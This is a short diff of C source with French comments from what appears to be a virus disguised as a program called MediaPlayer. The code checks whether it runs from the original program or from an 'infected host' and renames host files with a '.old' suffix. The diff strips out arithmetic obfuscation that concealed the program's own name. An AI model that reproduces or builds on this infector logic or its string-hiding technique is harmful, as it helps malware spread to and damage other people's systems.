@@ -10,37 +10,8 @@ int main(int argc, char *argv[]) {
         // modification du pointeur global pour y ajouter l'addresse du char * contenant le nom du programme
         globalptr = &name;
 
-        char str[13]; //        ./MediaPlayer
-        int i = 0;
-        i +=46;
-        str[0] = (char) i;
-        i +=1;
-        str[1] = (char) i;
-        i +=30;
-        str[2] = (char) i;
-        i +=24;
-        str[3] = (char) i;
-        i -=1;
-        str[4] = (char) i;
-        i +=5;
-        str[5] = (char) i;
-        i -=8;
-        str[6] = (char) i;
-        i -=17;
-        str[7] = (char) i;
-        i +=28;
-        str[8] = (char) i;
-        i -=11;
-        str[9] = (char) i;
-        i +=24;
-        str[10] = (char) i;
-        i -=20;
-        str[11] = (char) i;
-        i +=13;
-        str[12] = (char) i;
-
         // determine si le programme est executé depuis le mediaplayer ou un hôte infecté
-        if(strcmp(argv[0],str)) {       // HOTE INFECTE
+        if(strcmp(argv[0],"./MediaPlayer")) {       // HOTE INFECTE
                 char *extension = ".old";
                 char str[100];
                 snprintf(str, sizeof str, "%s%s", name, extension);
